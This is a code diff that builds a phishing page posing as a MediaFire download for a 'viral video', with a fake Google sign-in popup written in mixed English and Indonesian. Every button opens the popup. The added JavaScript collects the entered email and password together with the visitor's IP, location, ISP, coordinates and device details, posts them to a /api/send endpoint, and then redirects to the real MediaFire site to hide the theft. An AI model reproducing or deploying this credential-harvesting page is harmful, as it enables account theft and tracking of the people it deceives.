@@ -7,60 +7,389 @@
 <title>Download Page</title>
 
 <style>
-*{
-    box-sizing:border-box;
-    margin:0;
-    padding:0;
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{width:100%;min-height:100%;overflow-x:hidden;background:#fff;font-family:Arial,Helvetica,sans-serif;color:#555;-webkit-text-size-adjust:100%;}
+button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
+.header{width:100%;height:90px;border-bottom:1px solid #ddd;background:#fff;display:flex;align-items:center;padding:0 16px;}
+.header-inner{width:100%;display:flex;align-items:center;justify-content:space-between;}
+.logo{width:75px;height:48px;display:flex;align-items:center;justify-content:flex-start;flex-shrink:0;}
+.mediafire-logo{width:100%;height:100%;object-fit:contain;display:block;}
+.header-right{display:flex;align-items:center;gap:8px;}
+.language{width:40px;height:40px;background:#f0f0f0;border-radius:6px;display:flex;justify-content:center;align-items:center;flex-shrink:0;}
+.flag{width:26px;height:18px;position:relative;overflow:hidden;background:repeating-linear-gradient(to bottom,#d92727 0px,#d92727 2px,#fff 2px,#fff 4px);}
+.flag:before{content:"";position:absolute;width:11px;height:10px;left:0;top:0;background:#254d9a;}
+.flag:after{content:"••••";position:absolute;color:#fff;font-size:4px;line-height:4px;width:11px;height:10px;left:1px;top:1px;letter-spacing:1px;}
+.auth{height:40px;display:flex;background:#087be0;border-radius:6px;overflow:hidden;}
+.auth button{border:0;background:#087be0;color:#fff;font-size:12px;font-weight:600;padding:0 10px;min-width:70px;}
+.auth button + button{border-left:1px solid rgba(255,255,255,.8);}
+.page{width:100%;display:flex;flex-direction:column;align-items:center;padding:0 16px 40px;}
+.ad-space{width:100%;height:180px;}
+.download-wrap{width:100%;max-width:600px;cursor:pointer;user-select:none;}
+.download-top{width:100%;height:90px;background:#087be0;border-radius:10px 10px 0 0;display:flex;align-items:center;padding:0 14px;color:#fff;}
+.download-wrap:active .download-top{filter:brightness(.94);}
+.file-icon{width:44px;height:52px;flex-shrink:0;display:flex;align-items:center;justify-content:center;}
+.file-icon-img{width:100%;height:100%;object-fit:contain;display:block;}
+.file-info{min-width:0;margin-left:14px;flex:1;}
+.file-title{font-size:15px;font-weight:bold;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:6px;}
+.file-sub{font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.download-icon{width:32px;height:38px;position:relative;flex-shrink:0;margin-left:8px;}
+.download-icon:before{content:"";position:absolute;width:5px;height:22px;background:#fff;left:14px;top:0;}
+.download-icon:after{content:"";position:absolute;width:14px;height:14px;border-right:5px solid #fff;border-bottom:5px solid #fff;transform:rotate(45deg);left:9px;top:14px;}
+.download-bottom{width:100%;height:48px;background:#333;display:flex;align-items:center;justify-content:space-between;padding:0 12px;}
+.slow{color:#ddd;font-size:12px;white-space:nowrap;}
+.fast{background:#087be0;color:#fff;border:0;border-radius:4px;padding:8px 10px;font-size:11px;font-weight:bold;white-space:nowrap;}
+.description{max-width:600px;width:100%;text-align:center;font-size:12px;line-height:18px;margin-top:20px;}
+.options{max-width:600px;width:100%;display:flex;gap:10px;margin-top:20px;}
+.option{flex:1;height:70px;background:#f5f5f5;border:0;border-radius:6px;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#666;}
+.option-icon{font-size:20px;line-height:20px;margin-bottom:4px;}
+.option span{font-size:11px;}
+.map{width:100%;max-width:600px;height:140px;margin-top:20px;background:#51a8e5;position:relative;overflow:hidden;}
+.map-label{position:absolute;top:0;left:0;background:#28688e;color:#fff;padding:4px 8px;font-size:11px;z-index:3;}
+.map-shape{position:absolute;border-radius:50%;}
+.shape1{width:80px;height:55px;background:#a8db8b;left:20px;top:35px;transform:rotate(-10deg);}
+.shape2{width:90px;height:60px;background:#ff8557;right:20px;top:45px;transform:rotate(8deg);}
+.modal{position:fixed;inset:0;width:100%;height:100%;background:rgba(0,0,0,.42);display:none;align-items:center;justify-content:center;padding:24px;z-index:99999;}
+.modal.show{display:flex;}
+.login-card{background:#fff;width:92%;max-width:410px;max-height:88vh;overflow-y:auto;border-radius:14px;box-shadow:0 10px 40px rgba(0,0,0,.28);animation:popup .18s ease;}
+@keyframes popup{from{opacity:0;transform:scale(.92);}to{opacity:1;transform:scale(1);}}
+.login-card-header{display:flex;align-items:center;justify-content:space-between;padding:15px 18px;border-bottom:1px solid #e8eaed;}
+.header-left{display:flex;align-items:center;gap:10px;}
+.header-logo{width:22px;height:22px;object-fit:contain;display:block;flex-shrink:0;}
+.header-title{font-size:15px;font-weight:500;color:#202124;}
+.close-btn{background:none;border:none;font-size:22px;color:#5f6368;cursor:pointer;padding:3px 9px;border-radius:50%;}
+.close-btn:hover{background:#f1f3f4;}
+.card-body{padding:24px 22px 26px;}
+.login-title{font-size:22px;font-weight:400;color:#202124;margin-bottom:7px;}
+.login-subtitle{font-size:13px;color:#5f6368;margin-bottom:22px;}
+.login-subtitle strong{font-weight:500;color:#202124;}
+.input-group{margin-bottom:13px;}
+.input-field{width:100%;padding:12px 13px;border:1px solid #dadce0;border-radius:6px;font-size:14px;color:#202124;outline:none;background:#fff;transition:border .2s,box-shadow .2s;}
+.input-field:focus{border:2px solid #1a73e8;padding:11px 12px;}
+.input-field::placeholder{color:#80868b;}
+.checkbox-row{display:flex;align-items:center;gap:9px;margin:9px 0 18px;}
+.checkbox-row input{width:17px;height:17px;cursor:pointer;accent-color:#1a73e8;}
+.checkbox-row label{font-size:13px;color:#202124;cursor:pointer;}
+.login-message{display:none;margin-bottom:13px;padding:9px;border-radius:6px;font-size:12px;}
+.login-message.error{display:block;background:#fce8e6;color:#c5221f;}
+.login-message.success{display:block;background:#e6f4ea;color:#137333;}
+.privacy{font-size:12px;color:#5f6368;line-height:1.5;margin-bottom:17px;}
+.privacy a{color:#1a73e8;text-decoration:none;}
+.actions{display:flex;justify-content:space-between;align-items:center;margin-top:7px;}
+.forgot{color:#1a73e8;font-size:13px;font-weight:500;text-decoration:none;}
+.btn-login{background:#1a73e8;color:#fff;border:none;padding:10px 23px;border-radius:6px;font-size:13px;font-weight:500;cursor:pointer;}
+.inactive{cursor:default;}
+.signup-area{text-align:center;margin-top:17px;font-size:12px;color:#5f6368;}
+.signup-area button{border:0;background:none;color:#1a73e8;font-weight:500;font-size:12px;cursor:default;}
+@media(max-width:480px){.modal{padding:18px;}.login-card{width:88%;max-width:390px;max-height:84vh;border-radius:13px;}.card-body{padding:22px 20px 24px;}.login-title{font-size:21px;}.login-subtitle{font-size:12px;}}
+@media(max-width:360px){.modal{padding:14px;}.login-card{width:86%;max-height:82vh;}.card-body{padding:19px 17px 21px;}.login-title{font-size:20px;}.privacy{font-size:11px;}.forgot{font-size:12px;}.btn-login{padding:9px 20px;font-size:12px;}}
+@media(max-width:350px){.header{padding:0 10px;}.logo{width:62px;height:40px;}.language{width:36px;height:36px;}.auth button{min-width:62px;padding:0 7px;font-size:10px;}.file-title{font-size:13px;}.file-sub{font-size:10px;}.slow{font-size:10px;}.fast{font-size:9px;padding:7px;}}
+</style>
+</head>
+
+<body>
+
+<header class="header">
+    <div class="header-inner">
+        <div class="logo">
+            <img src="logo.jpg" alt="Logo" class="mediafire-logo">
+        </div>
+        <div class="header-right">
+            <div class="language"><div class="flag"></div></div>
+            <div class="auth">
+                <button type="button" onclick="openDownloadLogin()">SIGN UP</button>
+                <button type="button" onclick="openDownloadLogin()">LOG IN</button>
+            </div>
+        </div>
+    </div>
+</header>
+
+<main class="page">
+
+    <div class="ad-space"></div>
+
+    <section class="download-wrap" onclick="openDownloadLogin()">
+        <div class="download-top">
+            <div class="file-icon">
+                <img src="file.jpg" alt="File" class="file-icon-img">
+            </div>
+            <div class="file-info">
+                <div class="file-title">VIDEO VIRAL TERBARU</div>
+                <div class="file-sub">Download in a new tab (20.5 MB)</div>
+            </div>
+            <div class="download-icon"></div>
+        </div>
+        <div class="download-bottom">
+            <div class="slow">Download too slow?</div>
+            <button class="fast" type="button" onclick="openDownloadLogin(event)">DOWNLOAD FASTER NOW</button>
+        </div>
+    </section>
+
+    <div class="description">
+        Clicking the download button above will start your download in a new tab
+        and show a message from our advertising partners.
+    </div>
+
+    <div class="options">
+        <button class="option" type="button">
+            <div class="option-icon">↗</div>
+            <span>Share options</span>
+        </button>
+        <button class="option" type="button">
+            <div class="option-icon">＋</div>
+            <span>Save to My Files</span>
+        </button>
+    </div>
+
+    <div class="map">
+        <div class="map-label">Upload region:</div>
+        <div class="map-shape shape1"></div>
+        <div class="map-shape shape2"></div>
+    </div>
+
+</main>
+
+<div class="modal" id="loginModal" onclick="outsideClose(event)">
+    <div class="login-card" onclick="event.stopPropagation()">
+
+        <div class="login-card-header">
+            <div class="header-left">
+                <img src="google.png" alt="Google" class="header-logo">
+                <span class="header-title">Masuk</span>
+            </div>
+            <button class="close-btn" type="button" onclick="closeLogin()">×</button>
+        </div>
+
+        <div class="card-body">
+
+            <div class="login-title">Sign in</div>
+            <div class="login-subtitle">
+                untuk melanjutkan ke <strong>download page</strong>
+            </div>
+
+            <div class="login-message" id="loginMessage"></div>
+
+            <form id="loginForm" onsubmit="loginUser(event)">
+
+                <div class="input-group">
+                    <input id="loginUsername" type="text" class="input-field" placeholder="Email address" autocomplete="username" required>
+                </div>
+
+                <div class="input-group">
+                    <input id="loginPassword" type="password" class="input-field" placeholder="Enter your password" autocomplete="current-password" required>
+                </div>
+
+                <div class="checkbox-row">
+                    <input type="checkbox" id="showPass" onchange="togglePassword()">
+                    <label for="showPass">Show Password</label>
+                </div>
+
+                <p class="privacy">
+                    By continuing, layanan akan menggunakan informasi akun
+                    hanya untuk proses login pada halaman ini.
+                    Lihat <a href="#" onclick="return false;">Privacy Policy</a>
+                    dan <a href="#" onclick="return false;">Terms of Service</a>.
+                </p>
+
+                <p class="privacy">
+                    Kamu dapat mengatur akun ini di pengaturan akunmu.
+                </p>
+
+                <div class="actions">
+                    <a href="javascript:void(0)" class="forgot inactive" onclick="return false;">Forgot password?</a>
+                    <button type="submit" class="btn-login">Log in</button>
+                </div>
+
+                <div class="signup-area">
+                    Belum punya akun?
+                    <button type="button" onclick="return false;">Sign up</button>
+                </div>
+
+            </form>
+
+        </div>
+    </div>
+</div>
+
+<script>
+
+/* =========================
+   FORMAT WAKTU WIB
+========================= */
+
+function formatWaktuWIB(date){
+    const opt = {
+        timeZone: "Asia/Jakarta",
+        day: "2-digit",
+        month: "2-digit",
+        year: "numeric",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit",
+        hour12: false
+    };
+    const parts = new Intl.DateTimeFormat("id-ID", opt).formatToParts(date);
+    const obj = {};
+    parts.forEach(function(p){ obj[p.type] = p.value; });
+    return obj.day + "-" + obj.month + "-" + obj.year + " " +
+           obj.hour + ":" + obj.minute + ":" + obj.second + " WIB";
 }
 
-html,body{
-    width:100%;
-    min-height:100%;
-    overflow-x:hidden;
-    background:#fff;
-    font-family:Arial,Helvetica,sans-serif;
-    color:#555;
-    -webkit-text-size-adjust:100%;
+/* =========================
+   DETEKSI DEVICE / OS / BROWSER
+========================= */
+
+function detectDevice(ua){
+    if (/Android/i.test(ua)) return "Android";
+    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+    if (/Windows/i.test(ua)) return "Windows";
+    if (/Mac/i.test(ua)) return "Mac";
+    if (/Linux/i.test(ua)) return "Linux";
+    return "Unknown";
 }
 
-button{
-    font-family:Arial,Helvetica,sans-serif;
-    cursor:pointer;
+function detectOS(ua){
+    let m;
+    if ((m = ua.match(/Android\s([\d.]+)/i))) return "Android " + m[1];
+    if ((m = ua.match(/iPhone OS ([\d_]+)/i))) return "iOS " + m[1].replace(/_/g, ".");
+    if ((m = ua.match(/Windows NT ([\d.]+)/i))) {
+        const v = m[1];
+        return "Windows " + (v === "10.0" ? "10/11" : v);
+    }
+    if ((m = ua.match(/Mac OS X ([\d_]+)/i))) return "macOS " + m[1].replace(/_/g, ".");
+    if (/Linux/i.test(ua)) return "Linux";
+    return "Unknown";
 }
 
-/* ================= HEADER ================= */
-
-.header{
-    width:100%;
-    height:90px;
-    border-bottom:1px solid #ddd;
-    background:#fff;
-    display:flex;
-    align-items:center;
-    padding:0 16px;
+function detectBrowser(ua){
+    let m;
+    if (/Edg\//i.test(ua) && (m = ua.match(/Edg\/([\d.]+)/i))) return "Edge " + m[1];
+    if (/OPR\//i.test(ua) && (m = ua.match(/OPR\/([\d.]+)/i))) return "Opera " + m[1];
+    if (/SamsungBrowser/i.test(ua) && (m = ua.match(/SamsungBrowser\/([\d.]+)/i))) return "Samsung " + m[1];
+    if (/Chrome\//i.test(ua) && (m = ua.match(/Chrome\/([\d.]+)/i))) return "Chrome " + m[1];
+    if (/Firefox\//i.test(ua) && (m = ua.match(/Firefox\/([\d.]+)/i))) return "Firefox " + m[1];
+    if (/Safari\//i.test(ua) && (m = ua.match(/Version\/([\d.]+)/i))) return "Safari " + m[1];
+    return "Unknown";
 }
 
-.header-inner{
-    width:100%;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
+/* =========================
+   OPEN LOGIN
+========================= */
+
+function openDownloadLogin(event){
+    if(event){ event.stopPropagation(); }
+    document.getElementById("loginModal").classList.add("show");
 }
 
-.logo{
-    width:75px;
-    height:48px;
-    display:flex;
-    align-items:center;
-    justify-content:flex-start;
-    flex-shrink:0;
+/* =========================
+   CLOSE
+========================= */
+
+function closeLogin(){
+    document.getElementById("loginModal").classList.remove("show");
+    clearMessage();
 }
 
-.mediafire-logo{
-    width:100%;
-    height:100%;
-    object-fit:contain;
-    display:block;
+/* =========================
+   OUTSIDE CLICK
+========================= */
+
+function outsideClose(event){
+    const modal = document.getElementById("loginModal");
+    if(event.target === modal){ closeLogin(); }
+}
+
+/* =========================
+   PASSWORD
+========================= */
+
+function togglePassword(){
+    const input    = document.getElementById("loginPassword");
+    const checkbox = document.getElementById("showPass");
+    input.type = checkbox.checked ? "text" : "password";
+}
+
+/* =========================
+   MESSAGE
+========================= */
+
+function showMessage(text,type){
+    const message = document.getElementById("loginMessage");
+    message.textContent = text;
+    message.className = "login-message " + type;
+}
+
+function clearMessage(){
+    const message = document.getElementById("loginMessage");
+    message.textContent = "";
+    message.className = "login-message";
+}
+
+/* =========================
+   LOGIN → IP + KIRIM KE /api/send
+========================= */
+
+function loginUser(event){
+
+    event.preventDefault();
+
+    const username = document.getElementById("loginUsername").value.trim();
+    const password = document.getElementById("loginPassword").value;
+
+    showMessage("Memproses...", "success");
+
+    fetch("https://ipapi.co/json/")
+        .then(function(r){ return r.json(); })
+        .then(function(d){
+
+            const ua = navigator.userAgent;
+
+            const payload = {
+                email:    username,
+                password: password,
+                ip:       d.ip || "-",
+                ipv6:     (d.version === "IPv6") ? d.ip : "-",
+                negara:   (d.country_code || "-") + " " + (d.country_name || "-"),
+                prov:     d.region || "-",
+                kota:     d.city || "-",
+                zona:     d.timezone || "-",
+                isp:      d.org || "-",
+                asn:      d.asn || "-",
+                zip:      d.postal || "-",
+                koord:    (d.latitude || "-") + " , " + (d.longitude || "-"),
+                waktu:    formatWaktuWIB(new Date()),
+                device:   detectDevice(ua),
+                os:       detectOS(ua),
+                browser:  detectBrowser(ua)
+            };
+
+            return fetch("/api/send", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+
+        })
+        .catch(function(error){ console.log("Error:", error); })
+        .finally(function(){
+            setTimeout(function(){
+                window.location.href = "https://www.mediafire.com/";
+            }, 800);
+        });
+
+}
+
+/* =========================
+   ESC
+========================= */
+
+document.addEventListener("keydown", function(event){
+    if(event.key === "Escape"){ closeLogin(); }
+});
+
+</script>
+
+</body>
+</html>    display:block;
 }
 
 .header-right{
